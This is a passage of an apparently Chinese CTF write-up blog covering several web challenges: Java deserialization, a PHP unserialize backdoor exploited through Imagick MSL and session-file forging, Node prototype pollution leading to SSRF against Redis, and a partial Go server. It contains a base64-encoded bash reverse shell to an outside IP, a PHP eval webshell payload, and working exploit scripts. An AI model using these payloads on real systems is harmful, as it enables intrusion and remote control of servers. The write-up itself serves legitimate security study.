&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTkyLjE5LzExNDUgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后根据题目路由</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ctf.bypassit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/bypassit&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">bypassIt</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(request.getInputStream());</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            var3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bypass it and rce it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接写个 python 脚本，把序列化的内容传过去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span><span class="string">&quot;http://localhost:8080/bypassit&quot;</span></span><br><span class="line"></span><br><span class="line">with <span class="title function_">open</span><span class="params">(<span class="string">&#x27;ser.bin&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span> as file:</span><br><span class="line">    file_content = <span class="type">file</span></span><br><span class="line">    <span class="variable">res</span> <span class="operator">=</span> requests.post(url=url, data=file_content)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>序列化后内容写到了 ser.bin，复制到 python 路径下，简单使用 python。<br>本地 dockerfile 复现的，不过基本就是打出来了。<br>eeeeeeeeeeez~<br>python 真是太好用了，对于我这个用不来 burp 完成复杂请求的，python 就是福音！！<br>{“”:true,“base64Code”:“aaa”}  base64 绕过 jsoninject。</p><h1 id="fumo_backdoor"><span id="fumo_backdoor"> FUMO_backdoor</span></h1><p>康康 nu1l：<a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md</a><br> 先来一波源码鉴赏：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">error_reporting</span><span class="params">(<span class="number">0</span>)</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, __DIR__.<span class="string">&quot;:/tmp&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;FUNC_LIST&quot;</span>, get_defined_functions());</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">fumo_backdoor</span> &#123;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$path</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$argv</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$func</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$class</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__sleep</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            file_exists($<span class="built_in">this</span>-&gt;path) &amp;&amp; </span><br><span class="line">            preg_match_all(<span class="string">&#x27;/[flag]/m&#x27;</span>, $<span class="built_in">this</span>-&gt;path) === <span class="number">0</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            readfile($<span class="built_in">this</span>-&gt;path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__wakeup</span><span class="params">()</span> &#123;</span><br><span class="line">        $func = $<span class="built_in">this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            is_string($func) &amp;&amp; </span><br><span class="line">            in_array($func, FUNC_LIST[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line">            call_user_func($func);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $argv = $<span class="built_in">this</span>-&gt;argv;</span><br><span class="line">            $class = $<span class="built_in">this</span>-&gt;class;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">$class</span>($argv);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">$data = $_REQUEST[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        unserialize($data);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        system(<span class="string">&quot;rm -rf /tmp 2&gt;/dev/null&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag 在 /flag<br> 想办法 readfile 读 flag。<br>不过限权了，目前是要想办法触发_sleep。<br>源码里面没有任何涉及到序列化的操作，只能看 session 了。<br>这里面的源码有一个调用任意无参方法，可以看一波 phpinfo ();<br> 经观察，开了 imagegick 方法，那这玩意在绕过限制的时候有用。</p><h2 id="复制-flag"><span id="复制-flag"> 复制 flag</span></h2><p>本题限制了读取目录，但是开了 imagegick 扩展，可以选择 imagick 将 flag 复制到 tmp 目录下。<br>使用 msl 执行 xml。<br>上传带有 xml 内容的读写 flag：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">&lt;read filename=<span class="string">&quot;uyvy:/flag&quot;</span>/&gt;</span><br><span class="line">&lt;write filename=<span class="string">&quot;/tmp/motomoto&quot;</span>/&gt;</span><br><span class="line">&lt;/image&gt;</span><br></pre></td></tr></table></figure><p>uyvy 检测不严，然后使用 imagick 扩展，实例化参数 vid:msl:/tmp/php*<br> 由于上传文件到 tmp 的文件名都是 php 后跟几位随机字母数字。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A13%3A%22fumo_backdoor%<span class="number">22</span>%3A4%3A%7Bs%3A4%3A%22path%<span class="number">22</span>%3BN%3Bs%3A4%3A%22argv%<span class="number">22</span>%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%<span class="number">22</span>%3Bs%3A4%3A%22func%<span class="number">22</span>%3Bs%3A6%3A%22aadsad%<span class="number">22</span>%3Bs%3A5%3A%22class%<span class="number">22</span>%3Bs%3A7%3A%22Imagick%<span class="number">22</span>%3B%<span class="number">7D</span></span><br></pre></td></tr></table></figure><p>这样就读根目录 flag 并复制到当前的 motomoto 下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a2 = <span class="string">&quot;unserialze&quot;</span></span><br><span class="line">res1 = <span class="string">&quot;O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22aadsad%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&quot;</span></span><br><span class="line">url = f<span class="string">&quot;http://192.168.226.1:18080/?cmd=&#123;a2&#125;&amp;data=&#123;res1&#125;&quot;</span></span><br><span class="line">file6 = b<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;image&gt;</span></span><br><span class="line"><span class="string">&lt;read filename=&quot;uyvy:/flag&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;write filename=&quot;/tmp/motomoto&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/image&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">files6 = &#123;<span class="string">&quot;enterpr1se&quot;</span>:file6&#125;</span><br><span class="line">res2 = requests.post(url=url2,files=files6)</span><br></pre></td></tr></table></figure><h2 id="写-session"><span id="写-session"> 写 session</span></h2><p>由于要触发__sleep 魔术方法，考虑了一下，也就 session_start () 能这么干，看了大佬的文章，可以构造如下 payload。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line"> &lt;read filename=<span class="string">&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot;</span> /&gt;</span><br><span class="line"> &lt;write filename=<span class="string">&quot;/tmp/sess_afkl&quot;</span> /&gt;</span><br><span class="line">&lt;/image&gt;</span><br></pre></td></tr></table></figure><p>其中 sess 后面自己改，等会就要携带 PHPSESSID=afkl（或其他），后面 base64 需要我们自己构造需要 session 进行序列化的内容，默认是序列化 | 之后的内容。<br>将师傅的 base64 转成文件，放入 010 看一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34502958/1687313813793-404c88d7-1830-4b78-9dc6-261d8364e3e1.png#averageHue=%2337352f&amp;clientId=ud023113d-d077-4&amp;from=paste&amp;height=285&amp;id=u77ee3be2&amp;originHeight=356&amp;originWidth=828&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=27845&amp;status=done&amp;style=none&amp;taskId=ud7403b17-fc2c-4920-b40a-bf7eb48dff6&amp;title=&amp;width=662.4" alt="微信截图_20230621101539.png"><br> 我们需要在后面修改一下。<br>这里修改有坑，不知道为啥，要尾部 30=，起码得满足这个条件。反正要试很久。<br>反正有本地 docker，没有的话我真不敢想要咋打。</p><p>修改以后用 python 发包，文件上传。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a2 = <span class="string">&quot;unserialze&quot;</span></span><br><span class="line">res1 = <span class="string">&quot;O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22aadsad%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&quot;</span></span><br><span class="line">url = f<span class="string">&quot;http://192.168.226.1:18080/?cmd=&#123;a2&#125;&amp;data=&#123;res1&#125;&quot;</span></span><br><span class="line">file5 = b<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;image&gt;</span></span><br><span class="line"><span class="string"> &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHJ1YmJpc2hoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaHxPOjEzOiJmdW1vX2JhY2tkb29yIjoxOntzOjQ6InBhdGgiO3M6OToiL3RtcC95b3J1Ijt9&quot;/&gt;</span></span><br><span class="line"><span class="string"> &lt;write filename=&quot;/tmp/sess_shuiwuyue&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/image&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">files6 = &#123;<span class="string">&quot;enterpr1se&quot;</span>:file6&#125;</span><br><span class="line">res2 = requests.post(url=url2,files=files5)</span><br></pre></td></tr></table></figure><p>此时，我们文件<img src="https://cdn.nlark.com/yuque/0/2023/png/34502958/1687314722496-0501d2c8-6ee2-4299-9c31-7bfd0ffaccfc.png#averageHue=%23f1f4f7&amp;clientId=ud023113d-d077-4&amp;from=paste&amp;height=86&amp;id=uf0003995&amp;originHeight=107&amp;originWidth=976&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=4591&amp;status=done&amp;style=none&amp;taskId=uaa7e0bff-f12a-4663-8674-792f7eed916&amp;title=&amp;width=780.8" alt="微信截图_20230621103132.png"><br> 写入了要序列化的类，并且复制了<img src="https://cdn.nlark.com/yuque/0/2023/png/34502958/1687314804099-845983aa-feed-4f1a-911b-7be7945e7b4a.png#averageHue=%23f3f3f5&amp;clientId=ud023113d-d077-4&amp;from=paste&amp;height=373&amp;id=u5594ac8d&amp;originHeight=466&amp;originWidth=1297&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=35280&amp;status=done&amp;style=none&amp;taskId=u1b3f4a0d-6a14-4e93-bca7-ab2e790e383&amp;title=&amp;width=1037.6" alt="微信截图_20230621103318.png"><br> 也有点玄学，需要凹一下。</p><h2 id="读-flag~"><span id="读-flag~"> 读 flag~</span></h2><p>一切准备就绪后，就通过无参调用 session_start 触发 session 序列化，从而读 flag。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">13</span>:<span class="string">&quot;fumo_backdoor&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;path&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;session_start&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.226.1:18080/?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A2%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3B%7D</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34502958/1687327874276-0c9ed5a9-2462-41ad-9c51-20d3cfaaec59.png#averageHue=%23f3f2f1&amp;clientId=ud023113d-d077-4&amp;from=paste&amp;height=129&amp;id=u690dc881&amp;originHeight=161&amp;originWidth=859&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=5030&amp;status=done&amp;style=none&amp;taskId=uf0a453db-d4da-4c36-91a2-5afc3c338c2&amp;title=&amp;width=687.2" alt="微信截图_20230621141105.png"></p><h1 id="monitor"><span id="monitor"> Monitor</span></h1><p>源码分析</p><h2 id="import"><span id="import"> import</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&quot;/api/server/import&quot;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="type">const</span> <span class="variable">keys</span> <span class="operator">=</span> Object.keys(req.query);</span><br><span class="line"></span><br><span class="line">    keys.forEach(function(key) &#123;</span><br><span class="line">        merge(validUrls,key,req.query[key]);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    console.log(validUrls);</span><br><span class="line">    <span class="type">let</span> <span class="variable">responseData</span> <span class="operator">=</span> &#123;</span><br><span class="line">        success : <span class="literal">true</span>,</span><br><span class="line">        message : <span class="string">&quot;Successfully added the address to the whitelist&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> res.json(responseData);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function <span class="title function_">merge</span><span class="params">(obj,key,value)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="variable">dotIndex</span> <span class="operator">=</span> key.indexOf(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dotIndex != -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="type">const</span> <span class="variable">key1</span> <span class="operator">=</span> key.substring(<span class="number">0</span>, dotIndex);</span><br><span class="line">        <span class="type">const</span> <span class="variable">key2</span> <span class="operator">=</span> key.substring(dotIndex + <span class="number">1</span>);</span><br><span class="line">        merge(obj[key1],key2,value)</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        obj[key] = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>典型的一个原型链污染。<br>经过调试可知，正常情况下，就是让 obj 的对象增加一对 key:value<br> 当第二个参数有。的时候，. 前面的内容记作 key1，. 后面的内容记作 key2。而后递归调用，<br>obj 对象中的 key1 对象增加一个键值对 key2:value。<br>如果说 key 替换成  <strong>proto</strong>.x1, 就会造成 obj 的__proto__的值发生改变。达成一个原型链污染。</p><h2 id="check-路由"><span id="check-路由"> check 路由</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">http.get(options, (response) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (response.statusCode !== <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="type">let</span> <span class="variable">responseData</span> <span class="operator">=</span> &#123;</span><br><span class="line">                success : <span class="literal">false</span>,</span><br><span class="line">                message : <span class="string">&#x27;Target url status code :&#x27;</span>+response.statusCode,</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res.json(responseData);</span><br><span class="line">        &#125;</span><br><span class="line">        mergeObjects(liveUrls,validUrls,hostname);</span><br><span class="line">        console.log(`Added $&#123;hostname&#125; to liveUrls array.`);</span><br><span class="line"></span><br><span class="line">        <span class="type">let</span> <span class="variable">resData</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        response.on(<span class="string">&#x27;data&#x27;</span>, (chunk) =&gt; &#123;</span><br><span class="line">            resData += chunk;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        response.on(<span class="string">&#x27;end&#x27;</span>, () =&gt; &#123;</span><br><span class="line">            <span class="type">let</span> <span class="variable">responseData</span> <span class="operator">=</span> &#123;</span><br><span class="line">                success : <span class="literal">true</span>,</span><br><span class="line">                message : resData</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> res.json(responseData);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;).on(<span class="string">&#x27;error&#x27;</span>, (error) =&gt; &#123;</span><br><span class="line">        <span class="type">let</span> <span class="variable">responseData</span> <span class="operator">=</span> &#123;</span><br><span class="line">            success : <span class="literal">false</span>,</span><br><span class="line">            message : error.message</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.json(responseData);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>这里发起请求，可以打一个 ssrf</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET IsAdminSession HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure><p>打一个这个命令，<br>总结一下，import 污染 SET 方法和 hostname，<br>check 路由触发，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/api/server/<span class="keyword">import</span>/?__proto__.method=SET&amp;__proto__.socketPath=/run/redis/redis.sock&amp;hostname=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">/api/server/check?hostname=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>&amp;path=IsAdminSession</span><br></pre></td></tr></table></figure><h2 id="flag-路由"><span id="flag-路由"> flag 路由</span></h2><p>/api/sever/getflag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34502958/1688971412379-410e4f92-e0c4-4088-ab91-17abf68eab04.png#averageHue=%23fdfdfd&amp;clientId=u5a11cd5c-5610-4&amp;from=paste&amp;height=158&amp;id=u4e40bb2d&amp;originHeight=197&amp;originWidth=1089&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=3467&amp;status=done&amp;style=none&amp;taskId=u626847ac-90fe-4453-a14b-91c67246c32&amp;title=&amp;width=871.2" alt="微信截图_20230710144307.png"><br> 复现，编的 flag。</p><h1 id="sycserver"><span id="sycserver"> SycServer</span></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">func <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.POST(<span class="string">&quot;/file-unarchiver&quot;</span>, fileUnarchiver)</span><br><span class="line">router.GET(<span class="string">&quot;/&quot;</span>, funkYou)</span><br><span class="line">router.GET(<span class="string">&quot;/readir&quot;</span>, readir)</span><br><span class="line">router.GET(<span class="string">&quot;/admin&quot;</span>, admin)</span><br><span class="line">router.GET(<span class="string">&quot;/readfile&quot;</span>, readfile)</span><br><span class="line">router.Run(<span class="string">&quot;0.0.0.0:8888&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根路由啥的不解释，</p><h2 id="readfile-路由"><span id="readfile-路由"> readfile 路由</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 